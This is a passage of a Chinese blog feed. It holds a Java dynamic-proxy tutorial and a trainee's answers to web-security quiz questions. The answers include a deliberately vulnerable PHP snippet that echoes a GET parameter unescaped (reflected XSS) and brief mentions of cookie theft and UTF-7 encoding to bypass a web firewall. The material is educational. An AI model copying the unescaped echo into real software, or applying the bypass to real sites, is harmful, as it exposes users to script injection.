&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>重写invoke方法，把原来静态代理中代理类要完成的功能，放在重写之后的invoke方法中实现。</strong></p><p><strong>invoke方法表示代理对象要执行的功能代码。</strong></p><h3 id="newProxyInstance"><a href="#newProxyInstance" class="headerlink" title="newProxyInstance"></a>newProxyInstance</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader,</span><br><span class="hljs-params">                                          Class&lt;?&gt;[] interfaces,</span><br><span class="hljs-params">                                          InvocationHandler h)</span><br>        <span class="hljs-keyword">throws</span> IllegalArgumentException<br>    &#123;<br>        <span class="hljs-keyword">if</span> (h == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();<br>        &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Look up or generate the designated proxy class.</span><br><span class="hljs-comment">         */</span><br>        Class&lt;?&gt; cl = getProxyClass0(loader, interfaces); <span class="hljs-comment">// stack walk magic: do not refactor</span><br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Invoke its constructor with the designated invocation handler.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ih</span> <span class="hljs-operator">=</span> h;<br>            <span class="hljs-type">SecurityManager</span> <span class="hljs-variable">sm</span> <span class="hljs-operator">=</span> System.getSecurityManager();<br>            <span class="hljs-keyword">if</span> (sm != <span class="hljs-literal">null</span> &amp;&amp; ProxyAccessHelper.needsNewInstanceCheck(cl)) &#123;<br>                <span class="hljs-comment">// create proxy instance with doPrivilege as the proxy class may</span><br>                <span class="hljs-comment">// implement non-public interfaces that requires a special permission</span><br>                <span class="hljs-keyword">return</span> AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Object&gt;() &#123;<br>                    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                        <span class="hljs-keyword">return</span> newInstance(cons, ih);<br>                    &#125;<br>                &#125;);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> newInstance(cons, ih);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InternalError</span>(e.toString());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>关键函数:<code>Class&lt;?&gt; cl = getProxyClass0(loader, intfs);</code>主要就是生成代理类。</p><p>JDK会生成一个叫$Proxy0的代理类，这个类文件是放在内存中的，在创建代理类对象时，通过反射机制获得这个类的构造方法，然后创建代理类实例。</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="代理类-1"><a href="#代理类-1" class="headerlink" title="代理类"></a>代理类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Company</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">private</span> Object factory;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getFactory</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> factory;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFactory</span><span class="hljs-params">(Object factory)</span> &#123;<br>        <span class="hljs-built_in">this</span>.factory = factory;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(factory.getClass().getClassLoader(),factory.getClass().getInterfaces(),<span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        before();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> method.invoke(factory,args);<br>        after();<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;开始&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;结束&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> Proxy.newProxyInstance(factory.getClass().getClassLoader(),factory.getClass().getInterfaces(),<span class="hljs-built_in">this</span>);<br>&#125; #这一段代码其实就是为了创建代理对象，并且会执行hander中的invoke方法<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> method.invoke(factory,args);<br>#这个其实就是为了实现修改的部分，其 <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;...&#125;会被<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;...&#125;触发<br></code></pre></td></tr></table></figure><h4 id="创建接口"><a href="#创建接口" class="headerlink" title="创建接口"></a>创建接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AppleShop</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BananerShop</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="实现接口"><a href="#实现接口" class="headerlink" title="实现接口"></a>实现接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppleShopReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AppleShop</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;吃苹果啦&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BannerShopReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BananerShop</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;吃香蕉啦&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="实现类-2"><a href="#实现类-2" class="headerlink" title="实现类"></a>实现类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AppleShopReal</span> <span class="hljs-variable">appleShopReal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppleShopReal</span>();<br>        <span class="hljs-type">Company</span> <span class="hljs-variable">company</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Company</span>();<br>        company.setFactory(appleShopReal);<br>        <span class="hljs-type">AppleShop</span> <span class="hljs-variable">proxyInstance</span> <span class="hljs-operator">=</span> (AppleShop) company.getProxyInstance();<br>        proxyInstance.Apple();<br><br>        System.out.println(<span class="hljs-string">&quot;-------------------&quot;</span>);<br><br>        <span class="hljs-type">BannerShopReal</span> <span class="hljs-variable">bannerShopReal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BannerShopReal</span>();<br>        company.setFactory(bannerShopReal);<br>        <span class="hljs-type">BananerShop</span> <span class="hljs-variable">proxyInstance1</span> <span class="hljs-operator">=</span> (BananerShop) company.getProxyInstance();<br>        proxyInstance1.Bananer();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在我翻阅大佬博客的时候有几点值得注意的地方。<br> <code>AppleShop proxyInstance = (AppleShop) company.getProxyInstance();</code>和<code>BananerShop proxyInstance1 = (BananerShop) company.getProxyInstance();</code></p><p><strong>不能强转实现类。</strong>原因：不能用接口的实现类来转换Proxy的实现类，因为他们是同级的（代理类本身继承了Proxy），应该用共同的接口来转换。<br>成功。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045630.png" alt="QQ截图20220225204149"></p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nepnep见习队员任务（不完整）</title>
    <link href="/2022/02/24/Nepnep%E8%A7%81%E4%B9%A0%E9%98%9F%E5%91%98%E4%BB%BB%E5%8A%A1%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/"/>
    <url>/2022/02/24/Nepnep%E8%A7%81%E4%B9%A0%E9%98%9F%E5%91%98%E4%BB%BB%E5%8A%A1%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Nepnep见习队员"><a href="#Nepnep见习队员" class="headerlink" title="Nepnep见习队员"></a>Nepnep见习队员</h1><h2 id="初学-视频1"><a href="#初学-视频1" class="headerlink" title="初学-视频1"></a>初学-视频1</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217222652.png" alt="QQ截图20220217222652"></p><p>去youtube上找了翻译嘿嘿。<a href="https://www.youtube.com/watch?v=zPYfT9azdK8&amp;list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj">https://www.youtube.com/watch?v=zPYfT9azdK8&amp;list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj</a> （字幕自带翻译）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217222851.png" alt="QQ截图20220217222851"></p><p>这里就先回答第一个问题。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（<span class="hljs-number">5</span>分）<br><br><span class="hljs-attribute">bp</span>（抓包） 和 firefox（设置代理方便）<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）<br><br>体会太多啦~~<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>if(isset($_GET[ &#x27; name &#x27; ]))&#123;<br>echo &quot;&lt;h1&gt;Hello &#123;$_GET[&#x27;name&#x27;]&#125; !&lt;/h1&gt;&quot;;<br>&#125;<br>?&gt;<br>如果get方法存在name变量声明，则输出name的值。<br>&lt;form method=&quot;GET&quot;&gt;<br>Enter your name: &lt;input type=&quot;input&quot; name=&quot;name&quot;&gt;&lt;br&gt;<br>&lt;input type=&quot; submit&quot;&gt;<br>那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分）<br>服务端：前面部分 客户端：后面部分<br>    <br>客户端是通过传递什么参数来控制服务端代码的？（1分）<br>get<br><br>客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）<br>xss，反射。反射直接在网页中回显。<br>    <br>思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）<br>盗取cookie。<br>预防：1、过滤参数（但是无法完全实现），比如URL和参数进行各种的编码，比如escape, encodeURI, encodeURIComponent, 16进制，10进制，8进制，来绕过XSS过滤。<br>    2、黑白名单结合<br></code></pre></td></tr></table></figure><h2 id="初学-视频2"><a href="#初学-视频2" class="headerlink" title="初学-视频2"></a>初学-视频2</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分）<br>注入、失效身份认证和会话管理、跨站脚本XSS、失效的访问控制、安全配置错误、敏感信息泄露、跨站请求伪造CSRF、使用含有漏洞的控件、攻击检测和防范不足、未受保护的 APIs、不安全的反序列化、不足的日志记录和监控<br><br>肯定是常见，因为每个漏洞都很常见。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/owasp-top-10.jpg.imgw.850.x.jpg" alt="owasp-top-10.jpg.imgw.850.x"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">2.请翻译一下credential stuffing（1分<br><br>证书填充<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">3.</span>为什么说不充分的日志记录<span class="hljs-comment">(insufficient logging)</span>也算owasp十大漏洞的一种？他的危害性如何（<span class="hljs-number">2</span>分）<br><br>攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。比如日志没有记录登录失败，那么攻击者可能就可以通过暴力破解多次进行登录尝试，但是日志中却没有记录。这就可能让攻击者成功入侵系统并隐匿自己的行踪。这个看似危害不大但却是十分严重的危害，因为一个日志系统不完善的服务器很容易遭受攻击并且在遭受攻击后无法判断攻击来源，这样就无法做出相应的防御，很可能再次遭受同样的攻击。<br><br>只要是漏洞都严重。<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4</span>.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（<span class="hljs-number">3</span>分）<br><br><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">5.</span>you are <span class="hljs-keyword">only</span> <span class="hljs-keyword">as</span> good <span class="hljs-keyword">as</span> you notes<br>   you are <span class="hljs-keyword">only</span> <span class="hljs-keyword">as</span> good <span class="hljs-keyword">as</span> things you can refer <span class="hljs-keyword">to</span><br>结合这两句话谈谈你的感想。（<span class="hljs-number">2</span>分）<br><br>我正在做的事情。<br></code></pre></td></tr></table></figure><h2 id="初学-视频3"><a href="#初学-视频3" class="headerlink" title="初学-视频3"></a>初学-视频3</h2><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-number">1</span>.http报文的结构是什么？（<span class="hljs-number">1</span>分）<br><br><span class="hljs-number">1</span>、方式(<span class="hljs-keyword">method</span>)：客户端希望服务器对资源执行的动作，是一个单独的词，比如，<span class="hljs-title function_">GET</span>、<span class="hljs-title function_">POST</span>或<span class="hljs-title function_">HEAD</span><br><br>2、请求<span class="hljs-title function_">URL</span><span class="hljs-params">(request-URL)</span>：要直接与服务器进行对话，只要请求<span class="hljs-title function_">URL</span>是资源的绝对路径就可以了，服务器可以假定自己是<span class="hljs-title function_">URL</span>的主机/端口<br><br>3、版本<span class="hljs-params">(version)</span>：报文所使用的<span class="hljs-title function_">HTTP</span>版本。其格式：<span class="hljs-title function_">HTTP</span>/&lt;主要版本号&gt;.&lt;次要版本号&gt;<br><br>4、状态码<span class="hljs-params">(status-code)</span>：状态码是三位数字，描述了请求过程中所发生的情况。每个状态码的第一位数字都用于描述状态的一般类别<span class="hljs-params">(比如，“成功”、“出错”等等)</span><br><br>5、原因短语<span class="hljs-params">(reason-phrase)</span>：数字状态码的可读版本，包含行终止序列之前的所有文本。原因短语只对人类有意义，因此，尽管响应行<span class="hljs-title function_">HTTP</span>/1.0 200 <span class="hljs-title function_">NOT</span> <span class="hljs-title function_">OK</span>和<span class="hljs-title function_">HTTP</span>/1.0 200 <span class="hljs-title function_">OK</span>中原因短语的含义不同，但同样都会被当作成功指示处理<br><br>6、头部<span class="hljs-params">(header)</span>：可以有零个或多个头部，每个首部都包含一个名字，后面跟着一个冒号<span class="hljs-params">(:)</span>，然后是一个可选的空格，接着是一个值，最后是一个<span class="hljs-title function_">CRLF</span>首部是由一个空行<span class="hljs-params">(CRLF)</span>结束的，表示了头部列表的结束和实体主体部分的开始<br><br>7、实体的主体部分<span class="hljs-params">(entity-body)</span>：实体的主体部分包含一个由任意数据组成的数据块，并不是所有的报文都包含实体的主体部分，有时，报文只是以一个<span class="hljs-title function_">CRLF</span>结束。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217225853.png" alt="QQ截图20220217225853"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">2.</span>什么是<span class="hljs-literal">crlf</span>？在<span class="hljs-keyword">http</span>报文的哪个位置。（<span class="hljs-number">1</span>分）<br>已答。回车换行，每行末位。<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.解释下这几个头的含义（<span class="hljs-number">5</span>分）<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217230327.png" alt="QQ截图20220217230327"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-number">4</span>、cookie具有哪些特点，不同的域名和子域名对cookie有怎样的权限？Cookie的Secure和 HTTPOnly这两个flag分别有什么作用？请结合xss攻击来进行说明（<span class="hljs-number">3</span>分）<br><br>以键值对的形式临时存在。为域名设置的cookie，子域名也可读。子域名只可写自身的cookie。<br><br><span class="hljs-symbol">Secure:</span>限制只有通过https访问时才能传递cookie<br><br><span class="hljs-symbol">httponly:</span>阻止JavaScript读取cookie，可防xss攻击<br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">5.简述本视频提到的xss绕过web防火墙的方案（5分）<br>用UTF<span class="hljs-string">-7</span>/UTF<span class="hljs-string">-32</span>编码payload<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">6.内容嗅探是什么？主要有哪些类型？请分别举例，主要用途是什么？在什么情况下可以利用这些漏洞？。为什么facebook等网站需要使用不同的域名来存储图片？（5分）<br>通过解析文件的内容，来猜测MIME类型的格式。有浏览器嗅探和客户端嗅探。客户端嗅探可用来判断浏览器为什么浏览器。<br><br>有些MIME类型是可执行类型，可以通过混淆MIME嗅探算法来执行XSS。<br><br>防止内容嗅探。<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">7.同源策略是什么？限制是什么？浏览器在遇到哪两种情况的时候会用到同源策略？如何放松SOP限制？放松SOP限制会对浏览器插件安全造成怎样的破坏？<br><br></code></pre></td></tr></table></figure><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">8.</span>csrf是什么？如何设计规避csrf？视频中提到的错误的csrf配置方法是什么？<br>跨站请求伪造。<br><br>验证<span class="hljs-built_in">token</span>，验证HTTP请求的Referer，还有验证XHR里的自定义<span class="hljs-built_in">header</span>。<br><br>没有对请求来源进行验证/过滤<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">附加题：5、6两点主要利用的是由于服务端和客户端对同一信息的处理方式不同造成的漏洞，你还能举出相似的例子么？（1分）<br>SSTI<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>历程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>历程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>进入道格的那些事</title>
    <link href="/2022/02/24/%E8%BF%9B%E5%85%A5%E9%81%93%E6%A0%BC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <url>/2022/02/24/%E8%BF%9B%E5%85%A5%E9%81%93%E6%A0%BC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    
